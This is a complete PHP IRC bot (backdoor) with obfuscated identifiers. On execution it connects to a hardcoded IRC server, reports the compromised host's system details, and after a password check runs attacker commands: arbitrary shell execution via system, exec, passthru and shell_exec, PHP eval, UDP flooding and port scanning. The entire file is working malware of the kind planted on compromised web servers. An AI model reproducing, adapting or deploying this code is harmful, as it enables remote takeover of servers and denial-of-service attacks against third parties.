<?php set_time_limit(0); error_reporting(0);  class vZJRnzFvFZJRZrzbB {

 var $NzNNBNNVNrVnFnJ = array("BZZRvbjBBVRZjRzN"=>"gangbang.angels-agency.nl",
                     "BzZn"=>"25343",
                     "zjzrv"=>"scary",
                     "RjJvzr"=>"13",
                     "hDdHX"=>"#wWw#",
                     "FFv"=>"scan",
                     "nbNNRjZnb"=>"41aa15390e2efa34ac693c3bd7cb8e88",
                     "rFnBBnrZjf"=>".",
                     "jFzJZRBJFFJ"=>"a87710e60dee7645081a8fc2fab74dbd");
                      var $NNnvFffJjfZNVnFnVB = array(); 
 function aquymYAMiMQEM() 
 { 
    if(!($this->cgokGOOOS = fsockopen($this->NzNNBNNVNrVnFnJ['BZZRvbjBBVRZjRzN'],$this->NzNNBNNVNrVnFnJ['BzZn'],$e,$s,30))) 
    $this->aquymYAMiMQEM(); 
    $this->QeIeEUYeAaqamEmyq();
    if(strlen($this->NzNNBNNVNrVnFnJ['zjzrv'])>0) 
    $this->yeAiiEi("PASS ".$this->NzNNBNNVNrVnFnJ['zjzrv']);
    $this->MMMeQaaQQAQaiaqm();
    $this->mUqyMQAeeMaiMi();
 } function AUqMuayIaAAU($lXxd) 
 { 
    if(isset($this->NNnvFffJjfZNVnFnVB[$lXxd])) 
       return 1; 
    else 
       return 0; 
 } function muqEMeUQ($lXxd) 
 { 
    unset($this->NNnvFffJjfZNVnFnVB[$lXxd]); 
 } function yIIEIMYMyAyyqyeyAmu() {
	if (@ini_get("safe_mode") or strtolower(@ini_get("safe_mode")) == "on") { $PxhDllPHtTX = "\0034ON\003"; } else { $PxhDllPHtTX = "\0039OFF\003"; }

	$tLLttPhT = php_uname();
	if($tLLttPhT == "") { $zBoGhx = "\00315---\003"; } else { $zBoGhx = "\00315".$tLLttPhT."\003"; }
		 
	 $jngw = "\00315http://".$_SERVER['SERVER_NAME']."".$_SERVER['REQUEST_URI']."\003";
	 
	 $xlKsC =  getcwd()."";
	 
	 $pkcc = "\00315".$xlKsC."\003";

	$kCwWWCwWoo = fileperms("$xlKsC");

	if (($kCwWWCwWoo & 0xC000) == 0xC000) { $ggKwOSWgOKs = 's';
	} elseif (($kCwWWCwWoo & 0xA000) == 0xA000) { $ggKwOSWgOKs = 'l';
	} elseif (($kCwWWCwWoo & 0x8000) == 0x8000) { $ggKwOSWgOKs = '-';
	} elseif (($kCwWWCwWoo & 0x6000) == 0x6000) { $ggKwOSWgOKs = 'b';
	} elseif (($kCwWWCwWoo & 0x4000) == 0x4000) { $ggKwOSWgOKs = 'd';
	} elseif (($kCwWWCwWoo & 0x2000) == 0x2000) { $ggKwOSWgOKs = 'c';
	} elseif (($kCwWWCwWoo & 0x1000) == 0x1000) { $ggKwOSWgOKs = 'p';
	} else { $ggKwOSWgOKs = 'u'; }

	$ggKwOSWgOKs .= (($kCwWWCwWoo & 0x0100) ? 'r' : '-');
	$ggKwOSWgOKs .= (($kCwWWCwWoo & 0x0080) ? 'w' : '-');
	$ggKwOSWgOKs .= (($kCwWWCwWoo & 0x0040) ?	(($kCwWWCwWoo & 0x0800) ? 's' : 'x' ) :	(($kCwWWCwWoo & 0x0800) ? 'S' : '-'));

	$ggKwOSWgOKs .= (($kCwWWCwWoo & 0x0020) ? 'r' : '-');
	$ggKwOSWgOKs .= (($kCwWWCwWoo & 0x0010) ? 'w' : '-');
	$ggKwOSWgOKs .= (($kCwWWCwWoo & 0x0008) ?	(($kCwWWCwWoo & 0x0400) ? 's' : 'x' ) :	(($kCwWWCwWoo & 0x0400) ? 'S' : '-'));

	$ggKwOSWgOKs .= (($kCwWWCwWoo & 0x0004) ? 'r' : '-');
	$ggKwOSWgOKs .= (($kCwWWCwWoo & 0x0002) ? 'w' : '-');
	$ggKwOSWgOKs .= (($kCwWWCwWoo & 0x0001) ?	(($kCwWWCwWoo & 0x0200) ? 't' : 'x' ) :	(($kCwWWCwWoo & 0x0200) ? 'T' : '-'));
			
	$VrDx = "\00315".$ggKwOSWgOKs."\003";

	$this->MMauAymEMUy($this->NzNNBNNVNrVnFnJ['hDdHX'],"\00314[SAFE:\003\002 $PxhDllPHtTX\002\00314]\00315 $jngw \00314[pwd:]\00315 $pkcc \00314(\003$VrDx\00314) [uname:]\00315 $zBoGhx");
 } function AUiAMmmya($lXxd) 
 { 
    $this->NNnvFffJjfZNVnFnVB[$lXxd] = true; 
 } function UAYiUe($hDdHX,$FFv=NULL) 
 { 
    $this->yeAiiEi("JOIN $hDdHX $FFv"); 
 }function mUqyMQAeeMaiMi() 
 { 
    while(!feof($this->cgokGOOOS)) 
    { 
       $this->aMmmE = trim(fgets($this->cgokGOOOS,512)); 
       $rrjbFBnBnrVVf = explode(" ",$this->aMmmE); 
       if(substr($this->aMmmE,0,6)=="PING :") 
       { 
          $this->yeAiiEi("PONG :".substr($this->aMmmE,6)); 
       } 
       if(isset($rrjbFBnBnrVVf[1]) && $rrjbFBnBnrVVf[1] =="004") 
       { 
          $this->yeAiiEi("JOIN ".$this->NzNNBNNVNrVnFnJ['hDdHX']." ".$this->NzNNBNNVNrVnFnJ['FFv']."");
          $this->UAYiUe($this->NzNNBNNVNrVnFnJ['hDdHX'],$this->NzNNBNNVNrVnFnJ['FFv']);
          $this->yIIEIMYMyAyyqyeyAmu();
       } 
       if(isset($rrjbFBnBnrVVf[1]) && $rrjbFBnBnrVVf[1]=="433") 
       { 
          $this->MMMeQaaQQAQaiaqm(); 
       }
       if($this->aMmmE != $VnN_hth) 
       { 
          $vVVnRbvBfVjFJj = array(); 
          $gOO = substr(strstr($this->aMmmE," :"),2); 
          $WoKw = explode(" ",$gOO); 
          $wCgcK = explode("!",$rrjbFBnBnrVVf[0]); 
          $SoWgkC = explode("@",$wCgcK[1]); 
          $SoWgkC = $SoWgkC[1]; 
          $wCgcK = substr($wCgcK[0],1); 
          $OogwWGK = $rrjbFBnBnrVVf[0]; 
          if($WoKw[0]==$this->wCgcK) 
          { 
           for($L=0;$L<count($WoKw);$L++) 
              $vVVnRbvBfVjFJj[$L] = $WoKw[$L+1]; 
          } 
          else 
          { 
           for($L=0;$L<count($WoKw);$L++) 
              $vVVnRbvBfVjFJj[$L] = $WoKw[$L]; 
          } 
          if(count($rrjbFBnBnrVVf)>2) 
          { 
             switch($rrjbFBnBnrVVf[1]) 
             { 
                case "QUIT": 
                   if($this->AUqMuayIaAAU($OogwWGK)) 
                   { 
                      $this->muqEMeUQ($OogwWGK); 
                   } 
                break; 
                case "PART": 
                   if($this->AUqMuayIaAAU($OogwWGK)) 
                   { 
                      $this->muqEMeUQ($OogwWGK); 
                   } 
                break; 
                case "PRIVMSG": 
                   if(!$this->AUqMuayIaAAU($OogwWGK) && (md5($SoWgkC) == $this->NzNNBNNVNrVnFnJ['jFzJZRBJFFJ'] || $this->NzNNBNNVNrVnFnJ['jFzJZRBJFFJ'] == "*")) 
                   { 
                      if(substr($vVVnRbvBfVjFJj[0],0,1)==$this->NzNNBNNVNrVnFnJ['rFnBBnrZjf']) 
                      { 
                         switch(substr($vVVnRbvBfVjFJj[0],1)) 
                         { 
                            case "user": 
                              if(md5($vVVnRbvBfVjFJj[1])==$this->NzNNBNNVNrVnFnJ['nbNNRjZnb']) 
                              { 
                                 $this->AUiAMmmya($OogwWGK);
                              } 
                              else 
                              { 
                                 $this->qqaQauYAAy($this->NzNNBNNVNrVnFnJ['hDdHX'],"[\002Auth\002]: Fout password $wCgcK idioot!!");
                              } 
                            break; 
                         } 
                      } 
                   }
                   elseif($this->AUqMuayIaAAU($OogwWGK)) 
                   { 
                      if(substr($vVVnRbvBfVjFJj[0],0,1)==$this->NzNNBNNVNrVnFnJ['rFnBBnrZjf']) 
                      { 
                         switch(substr($vVVnRbvBfVjFJj[0],1)) 
                         {                            case "raw":
                               $this->yeAiiEi(strstr($gOO,$vVVnRbvBfVjFJj[1])); 
                            break;                            case "system": 
                               $wggsOSWcKGCG = substr(strstr($gOO,$vVVnRbvBfVjFJj[0]),strlen($vVVnRbvBfVjFJj[0])+1); 
                               $KkWCCwooKosSG = system($wggsOSWcKGCG); 
                               $gwsWkOsssogOkk = explode("\n",$KkWCCwooKosSG); 
                               for($L=0;$L<count($gwsWkOsssogOkk);$L++) 
                                  if($gwsWkOsssogOkk[$L]!=NULL) 
                                     $this->MMauAymEMUy($this->NzNNBNNVNrVnFnJ['hDdHX'],"      : ".trim($gwsWkOsssogOkk[$L])); 
                            break;                            case "info":
                               $this->yIIEIMYMyAyyqyeyAmu();
                            break;                            case "rndnick": 
                               $this->MMMeQaaQQAQaiaqm(); 
                            break;                            case "passthru": 
                               $wggsOSWcKGCG = substr(strstr($gOO,$vVVnRbvBfVjFJj[0]),strlen($vVVnRbvBfVjFJj[0])+1); 

                               $KkWCCwooKosSG = passthru($wggsOSWcKGCG); 
                               $gwsWkOsssogOkk = explode("\n",$KkWCCwooKosSG); 
                               for($L=0;$L<count($gwsWkOsssogOkk);$L++) 
                                  if($gwsWkOsssogOkk[$L]!=NULL) 
                                     $this->MMauAymEMUy($this->NzNNBNNVNrVnFnJ['hDdHX'],"      : ".trim($gwsWkOsssogOkk[$L])); 
                            break;                            case "restart": 
                               $this->yeAiiEi("QUIT :gerestart door $wCgcK");
                               fclose($this->cgokGOOOS); 
                               $this->aquymYAMiMQEM(); 
                            break;                            case "eval":
                              $eval = eval(substr(strstr($gOO,$vVVnRbvBfVjFJj[1]),strlen($vVVnRbvBfVjFJj[1])));
                            break;                            case "udpflood": 
                               if(count($vVVnRbvBfVjFJj)>3) 
                               { 
                                  $this->yeeaIYUIMuqQmeEUmM($vVVnRbvBfVjFJj[1],$vVVnRbvBfVjFJj[2],$vVVnRbvBfVjFJj[3]); 
                               } 
                            break;                            case "sexec":
                               $wggsOSWcKGCG = substr(strstr($gOO,$vVVnRbvBfVjFJj[0]),strlen($vVVnRbvBfVjFJj[0])+1); 
                               $KkWCCwooKosSG = shell_exec($wggsOSWcKGCG); 
                               $gwsWkOsssogOkk = explode("\n",$KkWCCwooKosSG); 
                               for($L=0;$L<count($gwsWkOsssogOkk);$L++) 
                                  if($gwsWkOsssogOkk[$L]!=NULL) 
                                     $this->MMauAymEMUy($this->NzNNBNNVNrVnFnJ['hDdHX'],"      : ".trim($gwsWkOsssogOkk[$L])); 
                            break;                            case "dns": 
                               if(isset($vVVnRbvBfVjFJj[1])) 
                               { 
                                  $Wo = explode(".",$vVVnRbvBfVjFJj[1]); 
                                  if(count($Wo)==4 && is_numeric($Wo[0]) && is_numeric($Wo[1]) && is_numeric($Wo[2]) && is_numeric($Wo[3])) 
                                  { 
                                     $this->MMauAymEMUy($this->NzNNBNNVNrVnFnJ['hDdHX'],"[\002dns\002]: ".$vVVnRbvBfVjFJj[1]." => ".gethostbyaddr($vVVnRbvBfVjFJj[1])); 
                                  } 
                                  else 
                                  { 
                                     $this->MMauAymEMUy($this->NzNNBNNVNrVnFnJ['hDdHX'],"[\002dns\002]: ".$vVVnRbvBfVjFJj[1]." => ".gethostbyname($vVVnRbvBfVjFJj[1])); 
                                  } 
                               } 
                            break;                            case "die": 
                               $this->yeAiiEi("QUIT :die command from $wCgcK");
                               fclose($this->cgokGOOOS); 
                               exit;                            case "logout": 
                               $this->muqEMeUQ($OogwWGK); 
                               $this->MMauAymEMUy($this->NzNNBNNVNrVnFnJ['hDdHX'],"[\002Auth\002]\00314 Je bent nu uitgelogt $wCgcK"); 
                            break;                            case "pscan": 
                               if(count($vVVnRbvBfVjFJj) > 2) 
                               { 
                                  if(fsockopen($vVVnRbvBfVjFJj[1],$vVVnRbvBfVjFJj[2],$e,$s,15)) 
                                     $this->MMauAymEMUy($this->NzNNBNNVNrVnFnJ['hDdHX'],"[\002pscan\002]: ".$vVVnRbvBfVjFJj[1].":".$vVVnRbvBfVjFJj[2]." is \2open\2"); 
                                  else 
                                     $this->MMauAymEMUy($this->NzNNBNNVNrVnFnJ['hDdHX'],"[\002pscan\002]: ".$vVVnRbvBfVjFJj[1].":".$vVVnRbvBfVjFJj[2]." is \2closed\2"); 
                               } 
                            break;                            case "exec": 
                               $wggsOSWcKGCG = substr(strstr($gOO,$vVVnRbvBfVjFJj[0]),strlen($vVVnRbvBfVjFJj[0])+1); 
                               $KkWCCwooKosSG = exec($wggsOSWcKGCG); 
                               $gwsWkOsssogOkk = explode("\n",$KkWCCwooKosSG); 
                               for($L=0;$L<count($gwsWkOsssogOkk);$L++) 
                                  if($gwsWkOsssogOkk[$L]!=NULL) 
                                     $this->MMauAymEMUy($this->NzNNBNNVNrVnFnJ['hDdHX'],"      : ".trim($gwsWkOsssogOkk[$L])); 
                            break;                         } 
                      } 
                   } 
                break; 
             } 
          } 
       } 
       $VnN_hth = $this->aMmmE; 
    } 
    $this->aquymYAMiMQEM(); 
 } function QeIeEUYeAaqamEmyq() {
  $XtDdHD = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789';	
  $pXXxlHt = strlen($XtDdHD);
  for($L=0;$L<6;$L++) {
	$IQM .= $XtDdHD[rand(0,$pXXxlHt-1)];
  }
  if(php_uname() == "") { $tLLttPhT = "---"; } else { $tLLttPhT = php_uname(); }
  $this->yeAiiEi("USER ".$IQM."-go 127.0.0.1 localhost :".$tLLttPhT."");
 } function yeAiiEi($dpD) 
 { 
    fwrite($this->cgokGOOOS,"$dpD\r\n"); 
 } function MMauAymEMUy($ld,$dpD)
 {
    $this->yeAiiEi("PRIVMSG $ld :$dpD");
 } function qqaQauYAAy($ld,$dpD)
 {
    $this->yeAiiEi("NOTICE $ld :$dpD");
 } function MMMeQaaQQAQaiaqm() {
  $XtDdHD = '[abcdefghijklm)nopqrstuvwxyz_ABCDEFGHIJKLM(NOPQRSTUVWXYZ-0123456789]';	
  $pXXxlHt = strlen($XtDdHD);
  for($L=0;$L<$this->NzNNBNNVNrVnFnJ['RjJvzr'];$L++) {
	$IQM .= $XtDdHD[rand(0,$pXXxlHt-1)];
  }
  $this->yeAiiEi("NICK ".$IQM."");
 } function yeeaIYUIMuqQmeEUmM($lXxd,$HpdhThhLdH,$aium) {
	$this->MMauAymEMUy($this->NzNNBNNVNrVnFnJ['hDdHX'],"[\002UdpFlood Gestart!\002]"); 
	$llxPPHlTL = "";
	for($L=0;$L<$HpdhThhLdH;$L++) { $llxPPHlTL .= chr(mt_rand(1,256)); }
	$HpDPh = time();
	$L = 0;
	while(time()-$HpDPh < $aium) {
		$zp=fsockopen("udp://".$lXxd,mt_rand(0,6000),$e,$s,5);
      	fwrite($zp,$llxPPHlTL);
       	fclose($zp);
		$L++;
	}
	$fCH = $L * $HpdhThhLdH;
	$fCH = $fCH / 1048576;
	$lJG = $fCH / $aium;
	$lJG = round($lJG);
	$fCH = round($fCH);
	$this->MMauAymEMUy($this->NzNNBNNVNrVnFnJ['hDdHX'],"[\002UdpFlood Afgerond!\002]: $fCH MB verzonden / gemiddelde: $lJG MB/s ");
 }}
$oSocOoKC = new vZJRnzFvFZJRZrzbB;
$oSocOoKC->aquymYAMiMQEM(); ?>